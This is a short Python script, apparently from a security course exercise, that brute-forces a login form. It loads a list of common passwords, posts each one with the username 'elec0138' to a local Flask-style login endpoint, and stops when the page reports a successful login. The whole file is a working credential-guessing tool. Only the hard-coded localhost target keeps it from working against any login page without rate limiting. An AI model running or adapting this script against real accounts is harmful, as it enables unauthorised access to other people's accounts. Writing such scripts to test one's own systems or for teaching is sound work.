import requests
import time

def attack(username, login_url):
    start_time = time.time()

    # 10000 most common passwords taken from https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
    common_pwd_path = "password-top1000.txt"
    with open(common_pwd_path, "r") as file:
        passwords = file.read().splitlines()
    
    for password in passwords:
        login_data = {'username': username, 'password': password}
        print(login_data)
        response = requests.post(login_url, data=login_data)
        if "You were successfully logged in" in response.text:
            print(f"Found correct password: {password}")
            end_time = time.time()
            print(f"Time taken: {end_time - start_time} seconds")
            break
        else:
            print(f"Failed with password: {password}")
    else:
        end_time = time.time()
        print(f"All passwords tried. Time taken: {end_time - start_time} seconds")

if __name__ == "__main__":
    attack('elec0138', 'http://127.0.0.1:5000/login')